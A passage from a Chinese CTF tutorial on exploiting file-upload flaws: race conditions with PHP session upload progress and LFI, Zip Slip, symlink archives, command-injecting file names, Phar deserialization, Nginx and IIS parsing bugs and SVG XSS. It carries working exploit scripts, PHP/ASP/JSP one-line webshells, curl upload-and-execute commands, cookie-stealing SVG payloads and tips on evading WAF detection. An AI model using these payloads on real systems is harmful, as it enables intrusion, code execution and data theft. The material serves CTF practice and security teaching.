| 并发多个上传 | 排队处理，单个检查变慢 |
| 并发大量访问 | 更多尝试机会 |
| 增加图片解码复杂度 | 让 `is_safe_file()` 更慢 |
| 控制远程资源超时 | 如果校验涉及远程请求 |
| 利用 Session Upload Progress | PHP 内置进度机制放大窗口 |
| 上传 + 包含同时触发 | 利用 LFI + 上传临时文件 |
| 使用 Keep-Alive 连接 | 减少 TCP 握手时间 |

**线程数量建议：**

| 场景 | 上传线程 | 访问线程 | 超时时间 | 说明 |
|:-----|:--------:|:--------:|:--------:|:------|
| 本地 CTF | 5 | 10 | 30 秒 | 网络延迟低 |
| 远程 CTF | 3 | 8 | 60 秒 | 考虑网络延迟 |
| 生产环境渗透 | 2 | 5 | 120 秒 | 隐蔽优先 |
| Docker 环境 | 8 | 20 | 20 秒 | 窗口通常更小 |
| 高并发场景 | 10 | 30 | 10 秒 | 单次窗口极短 |

#### PHP Session Upload Progress 机制（详细）

PHP 提供 `session.upload_progress` 机制，可以在上传过程中查看进度信息。这个机制会在 `/tmp/sess_XXXXXX` 中创建一个包含进度的 Session 文件。

```ini
; php.ini 设置
session.upload_progress.enabled = On
session.upload_progress.cleanup = On
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
```

**利用思路**：
1. 在文件上传开始时，PHP 将进度信息写入 Session 文件
2. 即使请求完成后 Session 文件被删除，但在上传期间可以被包含
3. 通过 LFI + 长文件名/长进度名 + 并发上传来利用

```python
import requests, threading

def race_with_php_session(target_url, lfi_url, session_id):
    """利用 PHP Session Upload Progress + LFI"""
    payload = "<?php system('cat /flag'); ?>"
    
    def upload():
        # 构造带 Session Progress 的上传请求
        files = {"file": ("test.jpg", b"GIF89a" + payload.encode(), "image/jpeg")}
        data = {"PHP_SESSION_UPLOAD_PROGRESS": "x" * 10000}  # 扩大 session 文件
        cookies = {"PHPSESSID": session_id}
        try:
            requests.post(target_url, files=files, data=data, cookies=cookies, timeout=5)
        except:
            pass
    
    def access_lfi():
        for _ in range(200):
            try:
                # LFI 包含 PHP session 文件
                r = requests.get(lfi_url + f"/tmp/sess_{session_id}", timeout=2)
                if "flag{" in r.text or "CTF{" in r.text:
                    print(f"[+] FLAG: {r.text}")
                    return
            except:
                pass
    
    threads = []
    for _ in range(10):
        threads.append(threading.Thread(target=upload))
    for _ in range(20):
        threads.append(threading.Thread(target=access_lfi))
    
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=15)
```

 **新手避坑 10：** 线程过多可能先把本地连接池打满，或让题目容器 OOM。成功一次就应该停止脚本。CTF 中要保存成功响应，防止 flag 只出现一次。

 **新手避坑 11：** 条件竞争的关键前提是"先落盘后检查"。如果后端在临时目录检查完成后才 `move_uploaded_file()`，通常没有竞争窗口。观察响应时间——如果非法文件被立即拒绝，可能是在临时目录就检查了。

 **新手避坑 12：** Session Upload Progress 利用需要同时满足：`session.upload_progress.enabled = On`、存在文件包含漏洞、知道 Session 文件路径、目标 PHP 版本合适。这四个条件缺一不可。

 **新手避坑 13：** 条件竞争脚本要设置合理的停止条件。成功获取 flag 后应立即终止所有线程，避免浪费题目资源。建议使用 `threading.Event()` 作为停止信号。

## 九、实战：压缩包上传

### 9.1 Zip Slip 路径穿越

网站允许上传 ZIP 并在服务端解压，如果不检查压缩包内成员文件名中的 `../`，就可能写出到任意目录。

**生成恶意 ZIP：**

```python
import zipfile

payload = b"<?php echo file_get_contents('/flag'); ?>"
with zipfile.ZipFile("payload.zip", "w") as z:
    z.writestr("../../../../var/www/html/shell.php", payload)
```

```bash
# 查看压缩包内容（安全习惯）
unzip -l payload.zip

# 输出：
# ../../../../var/www/html/shell.php
```

**是否成功取决于：**

1. 解压库是否阻止 `../`（Python `ZipFile.extractall()` 默认不阻止）
2. 解压目录与 Web 根目录的相对位置
3. Web 进程是否有目标目录写权限
4. 解压出的文件是否会被脚本引擎解析

**安全解压库检查：**

| 语言 | 函数/库 | 默认是否阻止穿越 |
|------|---------|-----------------|
| Python | `ZipFile.extractall()` | **不阻止**（需自行检查） |
| PHP | `ZipArchive::extractTo()` | **不阻止**（需自行检查） |
| Java | `ZipInputStream` | **不阻止**（需自行检查） |
| Java | `ZipFile("\$file").entries()` | API 不阻止，需开发者检查 |

### 9.2 符号链接攻击

某些归档格式（ZIP、TAR）支持符号链接。如果服务端解压后跟随攻击者创建的符号链接，可能：

1. **覆盖文件：** 符号链接指向关键文件，后续写入覆盖
2. **读取敏感文件：** 符号链接指向 `/flag`，下载功能返回 flag 内容
3. **扩大影响范围：** 配合后续操作覆盖更多文件

**构造恶意 TAR（含符号链接）：**

```bash
ln -s /etc/passwd link.txt
tar cvf symlink.tar link.txt
```

**注意：** 不同解压库对符号链接处理不同，需要结合源码验证。

### 9.3 文件名命令注入

解压后，如果后端把文件名拼进 Shell 命令：

```php
system("convert " . $file . " thumb_" . $file);
```

构造压缩包成员名：

```text
a.jpg;cat /flag > result.txt;#
```

最终命令变为：

```bash
convert a.jpg;cat /flag > result.txt;# thumb_a.jpg;cat /flag > result.txt;#
```

**条件：**
1. 后端使用 Shell 命令处理解压后的文件
2. 文件名直接拼接进命令字符串
3. 没有使用 `escapeshellarg()` 或参数数组

### 9.4 解压后的二次加载

上传压缩包后，服务端还可能：

1. 自动导入主题/插件
2. 加载模板文件
3. 执行安装脚本
4. 解析 YAML、XML、JSON 配置文件

**所以压缩包上传的攻击面不只是 Zip Slip，还要思考"解压后谁会读取这些文件"。**

### 9.5 Phar 文件与反序列化组合

**Phar 文件结构**：Phar 是 PHP 的归档格式，其元数据（Metadata）会被 `unserialize()` 反序列化。即使代码中没有 `unserialize()`，只要使用 `phar://` 协议访问文件，就会触发元数据反序列化。

```php
// 以下任何一个函数都可通过 phar:// 触发反序列化
file_get_contents('phar://test.phar/test.txt');
include('phar://test.phar/test.php');
is_dir('phar://test.phar');
file_exists('phar://test.phar');
filemtime('phar://test.phar');
```

**构造恶意 Phar 文件**：

```php
<?php
// 生成一个触发反序列化的 phar 文件
class EvilClass {
    public $cmd = 'cat /flag';
    public function __destruct() {
        system($this->cmd);
    }
}

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
// 设置元数据包含反序列化 gadget
$phar->setMetadata(new EvilClass());
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

**上传后的利用条件**：
1. 上传的 Phar 文件保存在服务器上
2. 存在任意位置文件读取（通过 `phar://` 访问）
3. 或存在 `file_exists()` / `is_dir()` 等文件操作函数接受 `phar://` 协议
4. 存在可利用的魔术方法（`__destruct`、`__wakeup`、`__toString` 等）

 **新手避坑**：Phar 反序列化不需要代码中有 `unserialize()` 函数。任何通过 phar:// 访问 Phar 文件的 PHP 文件操作都会触发元数据反序列化。需要检查是否存在可以触发 phar:// 的入口（文件包含、文件读取、文件判断等）。

## 十三、实战：完整例题

### 场景

```php
<?php
if (!isset($_FILES['file'])) die('no file');

$file = $_FILES['file'];
if ($file['type'] !== 'image/jpeg') die('only jpg');

$name = basename($file['name']);
$target = __DIR__ . '/uploads/' . $name;

if (!move_uploaded_file($file['tmp_name'], $target)) die('upload failed');
echo '/uploads/' . $name;
?>
```

### 分析

| 检查了什么 | 没检查什么 |
|-------------|------------|
| `$file['type'] === 'image/jpeg'` | 文件后缀 |
| — | 文件真实 MIME |
| — | 文件头 |
| — | 文件内容 |
| — | 上传目录是否允许 PHP |
| — | 文件名是否应随机化 |

### 利用步骤

**Step 1 — 准备探测文件：**

```php
<?php echo "UPLOAD_OK_7f3a"; ?>
```

**Step 2 — curl 上传：**

```bash
curl -i \
  -F "file=@shell.php;filename=shell.php;type=image/jpeg" \
  http://target.example/upload.php
```

**Step 3 — 验证解析：**

访问 `/uploads/shell.php`

- 显示 `UPLOAD_OK_7f3a` → PHP 标签被执行
- 下载文件或显示源码 → 没有 PHP 解析

**Step 4 — 读取 flag：**

```bash
# 方法1：file_get_contents
echo '<?php echo file_get_contents("/flag"); ?>' > shell.php

# 方法2：命令执行
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 上传并访问
curl -F "file=@shell.php;filename=shell.php;type=image/jpeg" http://target.example/upload.php
curl http://target.example/uploads/shell.php?cmd=cat%20/flag
```

**多环境 webshell 示例：**

```bash
# PHP 一句话
echo '<?php @eval($_POST[1]);?>' > shell.php

# ASP 一句话
echo '<%eval request("cmd")%>' > shell.asp

# JSP 一句话
echo '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' > shell.jsp
```

### 如果目录不解析 PHP

检查备用利用链（优先级从高到低）：

| 优先级 | 利用链 | 说明 |
|:------:|:-------|:-----|
| 1 | 文件包含漏洞 → 图片马 + LFI | 最常用 |
| 2 | 上传 `.htaccess` → Apache 配置 | 需 AllowOverride |
| 3 | 上传 `.user.ini` → PHP-FPM 配置 | `auto_prepend_file` |
| 4 | 路径穿越 → 写入 Web 其他目录 | `../` 遍历 |
| 5 | Nginx PATH_INFO → 解析差异 | `avatar.jpg/test.php` |
| 6 | 覆盖已有 PHP 文件 | 需文件名可预测 |
| 7 | 压缩包二次处理 → Zip Slip | 解压后文件被处理 |

** 新手避坑 12：** 如果上传目录不解析 PHP，不要死磕后缀绕过。优先检查是否存在文件包含漏洞，这是最可靠的替代利用链。

** 新手避坑 13：** 图片马直接访问通常只会显示图片或文本，不会执行 PHP。只有在被 `include()` 包含或上传目录配置了图片解析时才会执行。

## 十四、避坑：常见陷阱

### 14.1 工具与命令

**BurpSuite 主要用途：**

1. 抓取 multipart 请求，修改 `filename` 和 `Content-Type`
2. 替换文件内容
3. Intruder 测试候选后缀
4. 并行请求测试条件竞争

**curl 常用操作：**

```bash
# 查看响应头
curl -v -F "file=@payload.php;filename=payload.php" http://...

# 从文件读取 payload
curl -F "file=@/path/to/shell.php;filename=shell.php" http://...

# 带 Cookie 和 Referer
curl -b "session=xxx" -e "http://target/admin/" \
  -F "file=@shell.php;filename=shell.php" http://...
```

**文件分析工具：**

```bash
file avatar.jpg              # 判断文件类型
xxd -l 32 avatar.jpg         # 查看文件头
strings avatar.jpg | tail    # 查看末尾字符串
exiftool avatar.jpg           # 查看元数据
identify avatar.jpg           # 查看图片格式和尺寸
binwalk avatar.jpg            # 检测嵌入数据
unzip -l payload.zip          # 查看压缩包内容
```

### 14.2 上传后验证清单

- [ ] 文件是否确实保存在服务器上？
- [ ] 文件名是否被随机化？
- [ ] 保存路径是否可预测？
- [ ] 文件是否被重新编码或处理？
- [ ] 上传目录是否允许脚本解析？
- [ ] Webshell 是否能够正常执行？
- [ ] 是否有长度/大小限制？
- [ ] 是否有 CSRF Token 或身份验证？

### 14.3 常见误区

| 误区 | 真相 |
|:-----|:------|
| 上传成功 = RCE | 还需要目录解析、路径可知、内容未被破坏 |
| HTTP 200 = 代码执行 | 可能只是上传成功页面 |
| 图片马直接访问就能执行 | 只有在被 PHP 解析时才会执行 |
| `.php5` 在所有服务器都执行 | 取决于 PHP 和 Web 服务器配置 |
| `.phps` 是 Webshell | 通常用于显示源码，不是执行 |
| `eval()` 和 `system()` 一样 | `eval()` 接收 PHP 代码，`system()` 接收系统命令 |
| `$file['type']` 可信 | 来自客户端，完全可控 |
| `basename()` 安全 | 只是去掉路径，文件名仍可控 |
| `getimagesize()` 通过就安全 | 只能证明文件像图片，不保证无恶意代码 |
| 双写绕过总是有效 | 只适用于单次替换，循环过滤无效 |
| %00 截断总是有效 | 仅 PHP < 5.3.4 |
| Windows 技巧适用于 Linux | 尾部点号、::$DATA 仅 Windows 有效 |
| 请求被拒绝就换后缀 | 先分析拒绝原因，可能有其他绕过维度 |
| 先跑大量 payload | 先用最小探测文件确认解析 |
| 图片被重新编码还继续试图片马 | 重新编码后代码已消失，应换利用链 |

## 十五、知识总结表

### 后端验证绕过全景

| 验证维度 | 绕过思路 | 典型场景 | 难度 |
|----------|----------|----------|------|
| Content-Type | 修改 multipart 内部 MIME | 后端信任 `$_FILES['file']['type']` | 低 |
| 黑名单后缀 | 遗漏后缀/大小写/双写 | 过滤不完整 | 低-中 |
| 白名单后缀 | 配置文件上传/解析差异/路径穿越 | 过滤严格但其他维度有缺陷 | 中-高 |
| 文件头 | `GIF89a` 前缀伪造 | 仅检查前几个字节 | 低 |
| 图片结构 | 真实图片追加代码 | 使用 `getimagesize()` | 中 |
| 图片重新编码 | 无法绕过，换利用链 | `imagecreatefromstring()` + 重新生成 | 高（不可绕） |
| 关键字过滤 | 短标签/编码/其他函数 | 黑名单式内容过滤 | 中 |
| 路径穿越 | `../` URL 编码变种 | 直接拼接客户端文件名 | 中 |
| 条件竞争 | 并发上传+并发访问 | 先保存后检查 | 中 |
| Zip Slip | 压缩包内 `../` 路径 | 解压未检查成员路径 | 中 |
| 符号链接 | 解压后跟随链接 | 归档支持符号链接 | 中-高 |
| Apache `.htaccess` | 上传自定义配置 | `AllowOverride` 开启 | 中 |
| PHP `.user.ini` | `auto_prepend_file` | PHP-FPM 模式 | 中 |
| Nginx PATH_INFO | `avatar.jpg/test.php` | 无 `try_files $uri =404` | 中 |
| 文件名 XSS | 文件名含 HTML 标签 | 未转义输出 | 低 |

### 上传漏洞决策速查

| 现象 | 优先判断方向 | 下一步操作 |
|------|-------------|-----------|
| 选文件立即弹窗，无请求 | 前端 JS 检查 | Burp 改包或 curl 直接发送 |
| 改 `.php` 被拒绝 | 后缀检查 | 判断黑/白名单，测试遗漏后缀 |
| `.php` + 改 MIME 通过 | 可能只检查 MIME | 验证文件是否被解析 |
| `.jpg` 纯文本失败 | 文件头或图片结构检查 | 用真实图片加代码 |
| 上传后代码消失 | 图片被重新编码 | 换利用链，不再依赖图片马 |
| PHP 被下载不执行 | 目录不解析 | 文件包含/配置文件/路径写入 |
| 文件先出现后消失 | 先保存后删除 | 条件竞争脚本 |
| 文件名被随机化 | 服务端重命名 | 看响应和源码找命名算法 |
| 允许上传 ZIP | 后端解压 | Zip Slip/符号链接/二次处理 |
| 允许 SVG/HTML | 浏览器主动内容 | 存储型 XSS/同源页面 |
| 仅图片但存在 LFI | 组合利用 | 图片马 + 文件包含 |
| 能上传 `.htaccess` | Apache 配置 | 检查 AllowOverride |
| 能上传 `.user.ini` | PHP-FPM | 检查同目录 PHP 文件和缓存 |

### 配置文件利用速查

| 文件 | 环境 | 示例内容 | 生效条件 |
|:-----|:-----|:---------|:---------|
| `.htaccess` | Apache | `SetHandler application/x-httpd-php` | `AllowOverride FileInfo` |
| `.user.ini` | PHP CGI/FastCGI | `auto_prepend_file=shell.jpg` | PHP-FPM 模式 |
| `web.config` | IIS | `<handlers>` 定义 JPG→PHP | IIS + 应用目录 |

### 文件头检测绕过速查

| 文件类型 | 文件头（十六进制） | 文本标识 | 绕过写法 |
|:--------|:------------------|:---------|:---------|
| GIF | `47 49 46 38 39 61` | `GIF89a` | `GIF89a<?php ... ?>` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | 二进制 | PNG 头 + PHP 代码 |
| JPG | `FF D8 FF` | 二进制 | 真实 JPG 追加代码 |
| PDF | `25 50 44 46` | `%PDF` | PDF 头 + PHP 代码 |

### 条件竞争利用速查

### 16.2 Nginx 解析漏洞深度分析

**Nginx + PHP-FPM 的经典配置错误：**

```nginx
location ~ \.php$ {
    fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
    fastcgi_index index.php;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    include fastcgi_params;
}
```

当请求 `/uploads/avatar.jpg/test.php`：
1. Nginx 匹配到 `\.php$` 后缀，将请求交给 PHP-FPM
2. `SCRIPT_FILENAME` = `/var/www/html/uploads/avatar.jpg/test.php`
3. PHP-FPM 检查文件是否存在，发现 `test.php` 不存在
4. 但 PHP 的 `cgi.fix_pathinfo = 1` 开启时，PHP 会回退到 `/var/www/html/uploads/avatar.jpg`
5. `avatar.jpg` 作为 PHP 脚本执行

**防御配置：**

```nginx
location ~ \.php$ {
    # 只处理真实存在的 PHP 文件
    try_files $uri =404;
    fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    include fastcgi_params;
}
```

### 16.3 IIS 解析漏洞深度分析

| IIS 版本 | 漏洞类型 | 示例 | 说明 |
|:--------|:---------|:-----|:-----|
| IIS 6.0 | 目录解析 | `shell.asp/` 目录下所有文件按 ASP 解析 | 创建 .asp 目录 |
| IIS 6.0 | 分号截断 | `shell.asp;.jpg` | 分号后截断 |
| IIS 7.0/7.5 | FastCGI 解析 | `shell.php` 可执行 | 取决于 php-cgi 配置 |
| IIS 8.0+ | 基本无默认解析漏洞 | - | 较安全 |

**IIS 6.0 目录解析：**
- 如果上传目录名称以 `.asp` 结尾（如 `upload.asp/`），该目录下所有文件都会按 ASP 解析
- 需要能创建目录或路径穿越

**IIS 6.0 分号截断：**
```
原始: shell.asp;.jpg
IIS 认为: .jpg 后缀（安全）
ASP.NET 处理器: 遇到 ; 截断 → 按 .asp 处理
```

 **新手避坑**：IIS 解析漏洞主要集中在 IIS 6.0 版本。IIS 10 默认配置下这些技巧基本无效。不要看到 IIS 就套用 6.0 的漏洞。

### 16.4 条件竞争上传高级技巧

**利用 Session Upload Progress 扩大窗口：**

PHP 的 `session.upload_progress.enabled` 允许在文件上传期间读取进度信息。如果开启，可以结合此机制延长文件在临时目录的存活时间。

```python
import threading, requests, time

def race_with_progress():
    """利用 Session Upload Progress 扩大竞争窗口"""
    session = requests.Session()
    
    # 先获取 session ID
    session.get("http://target/index.php")
    
    # 构造包含进度信息的请求
    files = {
        "file": ("race.php", b"<?php system($_GET['cmd']); ?>", "image/jpeg")
    }
    data = {
        "PHP_SESSION_UPLOAD_PROGRESS": "x" * 10000  # 长进度名
    }
    
    def upload():
        session.post("http://target/upload.php", files=files, data=data, timeout=5)
    
    def access():
        for _ in range(100):
            try:
                r = requests.get("http://target/uploads/race.php?cmd=id", timeout=2)
                if "uid=" in r.text:
                    print(f"[+] SUCCESS: {r.text}")
                    return
            except:
                pass
    
    threads = []
    for _ in range(3):
        threads.append(threading.Thread(target=upload))
    for _ in range(10):
        threads.append(threading.Thread(target=access))
    
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=10)
```

**防检测技巧：**

| 技巧 | 说明 |
|:-----|:------|
| 使用 Session 复用 | 避免重复登录消耗时间 |
| 随机 User-Agent | 防止简单请求去重 |
| 控制请求频率 | 避免触发 WAF 限速 |
| 使用长连接 | 减少 TCP 握手开销 |
| 并发连接池 | 提高请求吞吐 |

 **新手避坑**：条件竞争的核心前提是先落盘后检查。如果后端在临时目录中完成检查再 `move_uploaded_file()`，通常没有竞争窗口。观察响应时间——非法文件被立即拒绝可能是在临时目录就检查了。

### 16.5 SVG XSS 深入利用

**SVG 的多种 XSS 触发方式：**

```xml
<!-- 方式1: onload 事件 -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>

<!-- 方式2: script 标签 -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>

<!-- 方式3: animate 事件 -->
<svg xmlns="http://www.w3.org/2000/svg">
  <animate onbegin="alert(1)" attributeName="x" dur="1s"/>
</svg>

<!-- 方式4: foreignObject + iframe -->
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject>
    <iframe src="javascript:alert(document.cookie)"></iframe>
  </foreignObject>
</svg>

<!-- 方式5: use 元素 -->
<svg xmlns="http://www.w3.org/2000/svg">
  <use href="data:application/xml;base64,..."/>
</svg>
```

**不同加载方式对 SVG XSS 的影响：**

| 加载方式 | onload 事件 | script 标签 | 说明 |
|:--------|:----------:|:-----------:|:-----|
| `<img src="x.svg">` |  不触发 |  不触发 | 浏览器不执行内联脚本 |
| `<object data="x.svg">` |  触发 |  触发 | 视为独立文档 |
| `<embed src="x.svg">` |  触发 |  触发 | 同 object |
| `<iframe src="x.svg">` |  触发 |  触发 | 同源时有效 |
| 直接导航 (Location Bar) |  触发 |  触发 | 完全执行 |
| 下载后打开 |  触发 |  触发 | 文件系统 |

 **新手避坑**：`<img>` 标签加载 SVG 时不会执行脚本和 onload 事件。测试 SVG XSS 时必须用 `<object>`、`<embed>` 或直接访问。另外，CSP 头中的 `script-src` 限制也会影响 SVG 脚本执行。

| Python Flask | `request.files` | 内存/临时目录 | `secure_filename()` 绕过 |
| Python Django | `request.FILES` | `FILE_UPLOAD_TEMP_DIR` | 后缀白名单不完整 |
| Java Servlet | `Part.getSubmittedFileName()` | `javax.servlet.context.tempdir` | 路径穿越 |
| Node Express | `multer` 中间件 | 可配置临时目录 | 文件名处理 |
| Go Gin | `c.FormFile()` | 内存/临时目录 | 配置相关 |
| ASP.NET | `Request.Files` | `Path.GetTempPath()` | IIS 解析 |

### 16.14 文件上传 5 分钟快速测试流程

```
① 上传一个最小的探测文件 test.php
   内容：<?php echo "UPLOAD_OK_7f3a"; ?>
   结果：
   ├─ 显示 UPLOAD_OK_7f3a → PHP 解析成功  直接进入 Step 4
   ├─ 显示源码/下载 → 目录不解析 → 进入 Step 2
   └─ 被拒绝 → 进入 Step 3

② 目录不解析时的备用方案
   ├─ 检查文件包含 LFI → 图片马 + include
   ├─ 检查 .htaccess/.user.ini 上传
   ├─ 检查路径穿越写其他目录
   └─ 检查 Nginx PATH_INFO

③ 被拒绝时的分层检查
   ├─ 改 Content-Type → 通过？→ 只检查 MIME
   ├─ 改后缀 → .phtml .php5 .php7 → 黑名单绕过
   ├─ 改文件头 → GIF89a + 代码 → 文件头检查
   ├─ 加真实图片头 → getimagesize() 检查
   └─ 综合测试 → 分层绕过

④ 解析成功后的利用
   ├─ 改为 file_get_contents('/flag') → 读 flag
   ├─ 改为 system($_GET['cmd']) → 命令执行
   └─ 改为 @eval($_POST[1]) → 代码执行
```

> **一句话总结：** 文件上传漏洞的核心不是"能否上传"，而是"上传后文件是否被解析执行"。遵循"探测→分析→绕过→验证"的流程：先用最小探测文件确认解析，再逐层测试绕过方式，最后验证代码执行。白名单优先找配置文件绕过和组合利用，黑名单优先找遗漏后缀和解析差异。
